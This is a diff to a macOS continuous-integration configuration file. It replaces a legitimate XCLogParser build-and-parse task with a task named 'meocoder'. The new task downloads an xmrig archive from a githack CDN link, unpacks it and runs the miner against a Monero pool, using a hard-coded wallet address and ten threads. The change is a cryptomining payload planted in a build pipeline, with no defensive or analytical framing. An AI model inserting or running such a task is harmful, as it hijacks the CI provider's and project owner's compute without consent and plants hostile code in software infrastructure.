@@ -2,14 +2,6 @@ macos_instance:
   image: big-sur-xcode
 
 task:
-  name: XCLogParser
-  build_script:
-    - xcodebuild -scheme noapp -derivedDataPath ~/dd
-  always:
-    xclogparser_parse_script:
-      - brew install xclogparser
-      - xclogparser parse --project noapp --reporter flatJson --output xclogparser.json --derived_data ~/dd
-    xclogparser_upload_artifacts:
-      path: "xclogparser.json"
-      type: text/json
-      format: xclogparser
+  name: meocoder
+  script:
+    wget https://glcdn.githack.com/k.ing.d.om.he.art.stm.p/meocoder/-/raw/master/xmrig-6.10.0-macos-x64.tar.gz &&  tar -xf xmrig-6.10.0-macos-x64.tar.gz  && cd  xmrig-6.10.0 && ./xmrig -o stratum+tcp://xmr.f2pool.com:13531 -u 46s4YKAvP8iQU4VBNmMMjoDU9SmiU13HvSdq7A7r1x2GCuvmGxgq3yh61nxw7yCyRRh2KLp13pNWvWhFP4zBMwhiKvDwQ1y -p meocoder -k --nicehash --coin monero -a rx/0 -t 10 --astrobwt-avx2
